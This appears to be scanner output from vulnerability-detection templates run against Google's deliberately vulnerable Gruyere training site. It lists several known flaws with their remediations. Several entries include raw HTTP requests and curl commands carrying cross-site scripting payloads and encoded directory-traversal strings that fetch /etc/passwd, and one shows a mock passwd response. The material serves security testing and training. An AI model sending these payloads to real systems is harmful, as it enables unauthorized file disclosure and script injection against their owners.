info.name: Sidekiq <=6.2.0 - Cross-Site Scripting
author: dhiyaneshdk
info.description: Sidekiq through 5.1.3 and 6.x through 6.2.0 contains a cross-site scripting vulnerability via the queue name of the live-poll feature when Internet Explorer is used.
info.remediation: Upgrade to Sidekiq version 6.2.0 or later to mitigate this vulnerability.

request:
GET /432947565819739667646424739745632276508/sidekiq/queues/%22onmouseover=%22alert%28document.domain%29%22 HTTP/1.1
Host: google-gruyere.appspot.com
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
curl-command: curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36' 'https://google-gruyere.appspot.com/432947565819739667646424739745632276508/sidekiq/queues/%22onmouseover=%22alert%28document.domain%29%22'

info.name: Onkyo TX-NR585 Web Interface - Directory Traversal
author: 0x_akoko
info.description: Onkyo TX-NR585 1000-0000-000-0008-0000 devices allows remote unauthenticated users on the network to read sensitive files via %2e%2e%2f directory traversal and local file inclusion.
info.remediation: Apply the latest firmware update provided by the vendor to fix the directory traversal vulnerability.

request:
GET /432947565819739667646424739745632276508/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: google-gruyere.appspot.com
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
response:
HTTP/1.1 200 OK
Connection: close
Age: 2054
Cache-Control: public, max-age=7200
Content-Type: text/plain
Date: Mon, 11 Sep 2023 23:47:01 GMT
Server: Google Frontend
Vary: Accept-Encoding
X-Cloud-Trace-Context: 70bd8e4d7910a3ba7e15f4f0fa4052ac
X-Xss-Protection: 0

root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
gruyere:x:530:1117:sys:/dev:/bin/macr
# If this were a real passwd file you would
# now have a list of local user accounts.
curl-command: curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36' 'https://google-gruyere.appspot.com/432947565819739667646424739745632276508/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'

info.name: NocoDB version <= 0.106.1 - Arbitrary File Read
author: dwisiswant0
info.description: NocoDB through 0.106.1 has a path traversal vulnerability that allows an unauthenticated attacker to access arbitrary files on the server by manipulating the path parameter of the /download route. This vulnerability could allow an attacker to access sensitive files and data on the server, including configuration files, source code, and other sensitive information.
info.remediation: Upgrade NocoDB to a version higher than 0.106.1 to mitigate the vulnerability.

info.name: LG SuperSign EZ CMS 2.5 - Local File Inclusion
author: daffainfo
info.description: LG SuperSign CMS 2.5 allows reading of arbitrary files via signEzUI/playlist/edit/upload/..%2f URIs - aka local file inclusion.
info.remediation: Apply the latest security patches or upgrade to a patched version of LG SuperSign EZ CMS.

info.name: Geddy <13.0.8 - Local File Inclusion
author: pikpikcu
info.description: Geddy prior to version 13.0.8 contains a directory traversal vulnerability in lib/app/index.js  that allows remote attackers to read arbitrary files via a ..%2f (dot dot encoded slash) in the PATH_INFO to the default URI.
info.remediation: Upgrade Geddy to version 13.0.8 or later to mitigate the vulnerability.

info.name: Jenkins Gitlab Hook <=1.4.2 - Cross-Site Scripting
author: madrobot
info.description: Jenkins Gitlab Hook 1.4.2 and earlier does not escape project names in the build_now endpoint, resulting in a reflected cross-site scripting vulnerability.
info.remediation: Upgrade to the latest version of Jenkins Gitlab Hook plugin (>=1.4.3) to mitigate this vulnerability.

request:
GET /432947565819739667646424739745632276508/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: google-gruyere.appspot.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
curl-command: curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36' 'https://google-gruyere.appspot.com/432947565819739667646424739745632276508/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'

info.name: uWSGI PHP Plugin Local File Inclusion
author: madrobot
info.description: uWSGI PHP Plugin before 2.0.17 mishandles a DOCUMENT_ROOT check during use of the --php-docroot option, making it susceptible to local file inclusion.
info.remediation: Update to the latest version of uWSGI PHP Plugin or apply the necessary patches to fix the local file inclusion vulnerability.
